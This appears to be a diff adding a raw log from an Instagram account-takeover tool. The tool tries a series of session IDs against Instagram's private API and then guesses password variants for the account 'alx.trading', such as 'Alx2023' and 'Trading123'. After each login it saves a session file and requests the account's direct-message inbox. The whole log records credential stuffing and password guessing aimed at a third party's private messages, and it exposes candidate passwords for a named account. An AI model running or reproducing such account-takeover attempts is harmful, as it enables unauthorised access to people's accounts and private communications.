@@ -1,0 +1,76 @@
+2025-05-28 16:28:56,527 INFO Trying sessionid: 82d00883%3A174826442...
+2025-05-28 16:28:57,528 INFO https://i.instagram.com/api/v1/users/82/info/
+2025-05-28 16:28:58,295 INFO None [200] GET https://i.instagram.com/api/v1/users/82/info/ (269.0.0.18.75, OnePlus 6T Dev)
+2025-05-28 16:28:58,295 WARNING Sessionid failed: 'pinned_channels_info'
+2025-05-28 16:28:58,295 INFO Trying sessionid: 4976283726%3A1JgRzA5...
+2025-05-28 16:28:59,296 INFO https://i.instagram.com/api/v1/users/4976283726/info/
+2025-05-28 16:28:59,595 INFO None [404] GET https://i.instagram.com/api/v1/users/4976283726/info/ (269.0.0.18.75, OnePlus 6T Dev)
+2025-05-28 16:28:59,595 WARNING Status 404: Endpoint /v1/users/4976283726/info/ does not exist
+2025-05-28 16:29:01,351 INFO [None] [401] GET https://www.instagram.com/graphql/query/?variables=%7B%22user_id%22%3A%224976283726%22%2C%22include_reel%22%3Atrue%7D&query_hash=ad99dd9d3646cc3c0dda65debcd266a7
+2025-05-28 16:29:04,683 INFO [None] [401] GET https://www.instagram.com/graphql/query/?variables=%7B%22user_id%22%3A%224976283726%22%2C%22include_reel%22%3Atrue%7D&query_hash=ad99dd9d3646cc3c0dda65debcd266a7
+2025-05-28 16:29:07,997 INFO [None] [401] GET https://www.instagram.com/graphql/query/?variables=%7B%22user_id%22%3A%224976283726%22%2C%22include_reel%22%3Atrue%7D&query_hash=ad99dd9d3646cc3c0dda65debcd266a7
+2025-05-28 16:29:07,997 WARNING Sessionid failed: 401 Client Error: Unauthorized for url: https://www.instagram.com/graphql/query/?variables=%7B%22user_id%22%3A%224976283726%22%2C%22include_reel%22%3Atrue%7D&query_hash=ad99dd9d3646cc3c0dda65debcd266a7
+2025-05-28 16:29:07,997 INFO Trying sessionid: 82d00883%3A174826442...
+2025-05-28 16:29:08,998 INFO https://i.instagram.com/api/v1/users/82/info/
+2025-05-28 16:29:09,291 INFO None [200] GET https://i.instagram.com/api/v1/users/82/info/ (269.0.0.18.75, OnePlus 6T Dev)
+2025-05-28 16:29:09,291 WARNING Sessionid failed: 'pinned_channels_info'
+2025-05-28 16:29:09,291 INFO All sessionids failed. Trying username/password login...
+2025-05-28 16:29:09,291 INFO Trying login: alx.trading:Alx2023
+2025-05-28 16:29:09,292 INFO [SUCCESS] Login and session saved: sessions/alx_trading_sessionid_1748449749.json
+2025-05-28 16:29:10,292 INFO https://i.instagram.com/api/v1/direct_v2/inbox/
+2025-05-28 16:29:24,019 WARNING Login failed: HTTPSConnectionPool(host='i.instagram.com', port=443): Max retries exceeded with url: /api/v1/direct_v2/inbox/?visual_message_return_type=unseen&thread_message_limit=10&persistentBadging=true&limit=20&is_prefetching=false (Caused by ResponseError('too many 500 error responses'))
+2025-05-28 16:29:24,020 INFO Trying login: alx.trading:Alx1234
+2025-05-28 16:29:24,020 INFO [SUCCESS] Login and session saved: sessions/alx_trading_sessionid_1748449764.json
+2025-05-28 16:29:25,020 INFO https://i.instagram.com/api/v1/direct_v2/inbox/
+2025-05-28 16:29:38,500 WARNING Login failed: HTTPSConnectionPool(host='i.instagram.com', port=443): Max retries exceeded with url: /api/v1/direct_v2/inbox/?visual_message_return_type=unseen&thread_message_limit=10&persistentBadging=true&limit=20&is_prefetching=false (Caused by ResponseError('too many 500 error responses'))
+2025-05-28 16:29:38,501 INFO Trying login: alx.trading:alx2023
+2025-05-28 16:29:38,501 INFO [SUCCESS] Login and session saved: sessions/alx_trading_sessionid_1748449778.json
+2025-05-28 16:29:39,502 INFO https://i.instagram.com/api/v1/direct_v2/inbox/
+2025-05-28 16:29:52,994 WARNING Login failed: HTTPSConnectionPool(host='i.instagram.com', port=443): Max retries exceeded with url: /api/v1/direct_v2/inbox/?visual_message_return_type=unseen&thread_message_limit=10&persistentBadging=true&limit=20&is_prefetching=false (Caused by ResponseError('too many 500 error responses'))
+2025-05-28 16:29:52,994 INFO Trying login: alx.trading:alx1234
+2025-05-28 16:29:52,995 INFO [SUCCESS] Login and session saved: sessions/alx_trading_sessionid_1748449792.json
+2025-05-28 16:29:53,995 INFO https://i.instagram.com/api/v1/direct_v2/inbox/
+2025-05-28 16:30:07,500 WARNING Login failed: HTTPSConnectionPool(host='i.instagram.com', port=443): Max retries exceeded with url: /api/v1/direct_v2/inbox/?visual_message_return_type=unseen&thread_message_limit=10&persistentBadging=true&limit=20&is_prefetching=false (Caused by ResponseError('too many 500 error responses'))
+2025-05-28 16:30:07,500 INFO Trying login: alx.trading:Alx2024
+2025-05-28 16:30:07,500 INFO [SUCCESS] Login and session saved: sessions/alx_trading_sessionid_1748449807.json
+2025-05-28 16:30:08,501 INFO https://i.instagram.com/api/v1/direct_v2/inbox/
+2025-05-28 16:30:22,016 WARNING Login failed: HTTPSConnectionPool(host='i.instagram.com', port=443): Max retries exceeded with url: /api/v1/direct_v2/inbox/?visual_message_return_type=unseen&thread_message_limit=10&persistentBadging=true&limit=20&is_prefetching=false (Caused by ResponseError('too many 500 error responses'))
+2025-05-28 16:30:22,017 INFO Trying login: alx.trading:alx2025
+2025-05-28 16:30:22,017 INFO [SUCCESS] Login and session saved: sessions/alx_trading_sessionid_1748449822.json
+2025-05-28 16:30:23,017 INFO https://i.instagram.com/api/v1/direct_v2/inbox/
+2025-05-28 16:30:36,677 WARNING Login failed: HTTPSConnectionPool(host='i.instagram.com', port=443): Max retries exceeded with url: /api/v1/direct_v2/inbox/?visual_message_return_type=unseen&thread_message_limit=10&persistentBadging=true&limit=20&is_prefetching=false (Caused by ResponseError('too many 500 error responses'))
+2025-05-28 16:30:36,677 INFO Trying login: alx.trading:alx2024
+2025-05-28 16:30:36,678 INFO [SUCCESS] Login and session saved: sessions/alx_trading_sessionid_1748449836.json
+2025-05-28 16:30:37,678 INFO https://i.instagram.com/api/v1/direct_v2/inbox/
+2025-05-28 16:30:51,233 WARNING Login failed: HTTPSConnectionPool(host='i.instagram.com', port=443): Max retries exceeded with url: /api/v1/direct_v2/inbox/?visual_message_return_type=unseen&thread_message_limit=10&persistentBadging=true&limit=20&is_prefetching=false (Caused by ResponseError('too many 500 error responses'))
+2025-05-28 16:30:51,234 INFO Trying login: alx.trading:Alx2025
+2025-05-28 16:30:51,234 INFO [SUCCESS] Login and session saved: sessions/alx_trading_sessionid_1748449851.json
+2025-05-28 16:30:52,235 INFO https://i.instagram.com/api/v1/direct_v2/inbox/
+2025-05-28 16:31:05,840 WARNING Login failed: HTTPSConnectionPool(host='i.instagram.com', port=443): Max retries exceeded with url: /api/v1/direct_v2/inbox/?visual_message_return_type=unseen&thread_message_limit=10&persistentBadging=true&limit=20&is_prefetching=false (Caused by ResponseError('too many 500 error responses'))
+2025-05-28 16:31:05,841 INFO Trying login: alx.trading:Alx12345
+2025-05-28 16:31:05,841 INFO [SUCCESS] Login and session saved: sessions/alx_trading_sessionid_1748449865.json
+2025-05-28 16:31:06,841 INFO https://i.instagram.com/api/v1/direct_v2/inbox/
+2025-05-28 16:31:20,611 WARNING Login failed: HTTPSConnectionPool(host='i.instagram.com', port=443): Max retries exceeded with url: /api/v1/direct_v2/inbox/?visual_message_return_type=unseen&thread_message_limit=10&persistentBadging=true&limit=20&is_prefetching=false (Caused by ResponseError('too many 500 error responses'))
+2025-05-28 16:31:20,611 INFO Trying login: alx.trading:alx12345
+2025-05-28 16:31:20,611 INFO [SUCCESS] Login and session saved: sessions/alx_trading_sessionid_1748449880.json
+2025-05-28 16:31:21,612 INFO https://i.instagram.com/api/v1/direct_v2/inbox/
+2025-05-28 16:31:35,341 WARNING Login failed: HTTPSConnectionPool(host='i.instagram.com', port=443): Max retries exceeded with url: /api/v1/direct_v2/inbox/?visual_message_return_type=unseen&thread_message_limit=10&persistentBadging=true&limit=20&is_prefetching=false (Caused by ResponseError('too many 500 error responses'))
+2025-05-28 16:31:35,342 INFO Trying login: alx.trading:alx123456
+2025-05-28 16:31:35,342 INFO [SUCCESS] Login and session saved: sessions/alx_trading_sessionid_1748449895.json
+2025-05-28 16:31:36,343 INFO https://i.instagram.com/api/v1/direct_v2/inbox/
+2025-05-28 16:31:50,321 WARNING Login failed: HTTPSConnectionPool(host='i.instagram.com', port=443): Max retries exceeded with url: /api/v1/direct_v2/inbox/?visual_message_return_type=unseen&thread_message_limit=10&persistentBadging=true&limit=20&is_prefetching=false (Caused by ResponseError('too many 500 error responses'))
+2025-05-28 16:31:50,321 INFO Trying login: alx.trading:Trading123
+2025-05-28 16:31:50,322 INFO [SUCCESS] Login and session saved: sessions/alx_trading_sessionid_1748449910.json
+2025-05-28 16:31:51,322 INFO https://i.instagram.com/api/v1/direct_v2/inbox/
+2025-05-28 16:32:04,835 WARNING Login failed: HTTPSConnectionPool(host='i.instagram.com', port=443): Max retries exceeded with url: /api/v1/direct_v2/inbox/?visual_message_return_type=unseen&thread_message_limit=10&persistentBadging=true&limit=20&is_prefetching=false (Caused by ResponseError('too many 500 error responses'))
+2025-05-28 16:32:04,835 INFO Trying login: alx.trading:trading123
+2025-05-28 16:32:04,835 INFO [SUCCESS] Login and session saved: sessions/alx_trading_sessionid_1748449924.json
+2025-05-28 16:32:05,836 INFO https://i.instagram.com/api/v1/direct_v2/inbox/
+2025-05-28 16:32:19,458 WARNING Login failed: HTTPSConnectionPool(host='i.instagram.com', port=443): Max retries exceeded with url: /api/v1/direct_v2/inbox/?visual_message_return_type=unseen&thread_message_limit=10&persistentBadging=true&limit=20&is_prefetching=false (Caused by ResponseError('too many 500 error responses'))
+2025-05-28 16:32:19,459 INFO Trying login: alx.trading:Alx123456
+2025-05-28 16:32:19,459 INFO [SUCCESS] Login and session saved: sessions/alx_trading_sessionid_1748449939.json
+2025-05-28 16:32:20,459 INFO https://i.instagram.com/api/v1/direct_v2/inbox/
+2025-05-28 16:32:33,919 WARNING Login failed: HTTPSConnectionPool(host='i.instagram.com', port=443): Max retries exceeded with url: /api/v1/direct_v2/inbox/?visual_message_return_type=unseen&thread_message_limit=10&persistentBadging=true&limit=20&is_prefetching=false (Caused by ResponseError('too many 500 error responses'))
+2025-05-28 16:32:33,920 INFO Trying login: alx.trading:alx.trading12345
+2025-05-28 16:32:33,920 INFO [SUCCESS] Login and session saved: sessions/alx_trading_sessionid_1748449953.json
+2025-05-28 16:32:34,920 INFO https://i.instagram.com/api/v1/direct_v2/inbox/
